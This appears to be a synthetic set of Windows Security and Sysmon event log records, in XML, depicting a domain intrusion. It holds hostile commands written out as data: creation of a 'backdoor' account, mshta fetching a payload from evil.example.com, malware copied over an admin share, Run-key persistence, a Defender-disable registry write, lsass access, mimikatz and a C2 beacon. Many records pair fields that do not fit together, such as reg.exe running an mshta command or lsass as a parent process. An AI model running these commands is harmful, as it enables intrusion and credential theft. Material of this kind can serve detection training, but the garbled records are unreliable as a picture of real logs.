  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:05:12.0000000Z" /><EventRecordID>2055</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CORP</Data><Data Name="TargetServerName">JUMPHOST01</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:05:28.0000000Z" /><EventRecordID>2056</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:05:28.0000000Z</Data><Data Name="ProcessGuid">{16D1F-125B4-AE2C-B84A}</Data><Data Name="ProcessId">54938</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="CommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="User">CORP\SYSTEM</Data><Data Name="ParentProcessId">6907</Data><Data Name="ParentImage">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="ParentCommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="Hashes">MD5=7f2fdde1e9a9fd9ec6641caea428b536,SHA256=cd794a6418032f5ea317189cc7ebc5caa5dc855875fe4822444ac9e28c7cd50e</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:05:56.0000000Z" /><EventRecordID>2057</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-9617-5699-2783-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">20176</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">WKSTN-CHARLIE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:05:58.0000000Z" /><EventRecordID>2058</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="TargetServerName">WKSTN-BOB</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:06:18.0000000Z" /><EventRecordID>2059</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:06:18.0000000Z</Data><Data Name="ProcessId">34151</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="QueryName">beacon.attacker.top</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">10.0.2.99</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:06:29.0000000Z" /><EventRecordID>2060</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-7852-2257-2511-1001</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">62220</Data><Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>10</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:06:38.0000000Z" /><EventRecordID>2061</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:06:38.0000000Z</Data><Data Name="SourceProcessId">36134</Data><Data Name="SourceImage">C:\Windows\System32\powershell.exe</Data><Data Name="TargetProcessId">27689</Data><Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data><Data Name="GrantedAccess">0x1fffff</Data><Data Name="CallTrace">C:\Windows\System32\ntdll.dll+0x1af8</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:06:52.0000000Z" /><EventRecordID>2062</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="NewProcessId">0xda6d</Data><Data Name="NewProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="CommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="ParentProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xce6</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:07:06.0000000Z" /><EventRecordID>2063</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-1294-1690-4161-1001</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">10.0.2.99</Data><Data Name="IpPort">35119</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">JUMPHOST01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:07:19.0000000Z" /><EventRecordID>2064</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0xbf56</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x84a</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:07:44.0000000Z" /><EventRecordID>2065</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-4581-5161-6579-1001</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.2.99</Data><Data Name="IpPort">4435</Data><Data Name="ProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="WorkstationName">SRV-FILE01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Eventlog" /><EventID>1102</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:07:48.0000000Z" /><EventRecordID>2066</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="SubjectLogonId">0x8c4243</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:07:55.0000000Z" /><EventRecordID>2067</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:07:55.0000000Z</Data><Data Name="ProcessGuid">{1339A-AE1E-BBBF-3BB7}</Data><Data Name="ProcessId">8590</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="CommandLine">C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp</Data><Data Name="User">CONTOSO\charlie</Data><Data Name="ParentProcessId">5080</Data><Data Name="ParentImage">C:\Windows\System32\lsass.exe</Data><Data Name="ParentCommandLine">C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp</Data><Data Name="Hashes">MD5=67fe4401c23837cb568c1e874b9632fc,SHA256=fdc58a72c605bec7be84ae31e23db557ab94664cc8edc73c2e42157a06abe2dc</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:08:22.0000000Z" /><EventRecordID>2068</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:08:22.0000000Z</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="User">CORP\svc_backup</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">192.168.1.200</Data><Data Name="SourcePort">43303</Data><Data Name="DestinationIp">10.0.2.99</Data><Data Name="DestinationPort">4444</Data><Data Name="DestinationHostname">beacon.attacker.top</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:08:44.0000000Z" /><EventRecordID>2069</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:08:44.0000000Z</Data><Data Name="ProcessId">25285</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="TargetFilename">C:\Windows\Temp\stager.exe</Data><Data Name="CreationUtcTime">2024-11-25T19:08:44.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:09:01.0000000Z" /><EventRecordID>2070</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">.</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::10.0.0.5</Data><Data Name="Status">0x25</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:09:07.0000000Z" /><EventRecordID>2071</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:09:07.0000000Z</Data><Data Name="ProcessGuid">{02F23-10F0D-A9BF-15181}</Data><Data Name="ProcessId">53908</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="CommandLine">reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d C:\temp\update.exe</Data><Data Name="User">CONTOSO\svc_sql</Data><Data Name="ParentProcessId">6700</Data><Data Name="ParentImage">C:\Windows\System32\lsass.exe</Data><Data Name="ParentCommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="Hashes">MD5=4102c7b49d31a2927ec1af9feaa34df1,SHA256=7f133fa0f77ab56bdbc341c45f2dde9f8e779d92ecadddce84e2386051cb9cde</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:09:10.0000000Z" /><EventRecordID>2072</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:09:10.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">59271</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="TargetObject">HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware</Data><Data Name="Details">C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:09:31.0000000Z" /><EventRecordID>2073</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0x359d</Data><Data Name="NewProcessName">C:\Windows\System32\reg.exe</Data><Data Name="CommandLine">mshta.exe http://evil.example.com/payload.hta</Data><Data Name="ParentProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x649</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:10:21.0000000Z" /><EventRecordID>2074</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">.</Data><Data Name="ObjectName">C:\Windows\Temp\stager.exe</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:10:48.0000000Z" /><EventRecordID>2075</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:10:48.0000000Z</Data><Data Name="ProcessGuid">{09940-BDCF-6F67-10328}</Data><Data Name="ProcessId">27490</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="CommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="User">CORP\bob</Data><Data Name="ParentProcessId">6781</Data><Data Name="ParentImage">C:\Windows\System32\powershell.exe</Data><Data Name="ParentCommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="Hashes">MD5=0d121eb319c0e005c21f72fd3418d38e,SHA256=990e15792022ae27baebe265fdbbe6a3e1ad221ebad80975ebd887c37aa0ee6a</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:11:06.0000000Z" /><EventRecordID>2076</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-4737-9519-4610-1001</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">44942</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="WorkstationName">SRV-SQL01</Data></EventData></Event>
  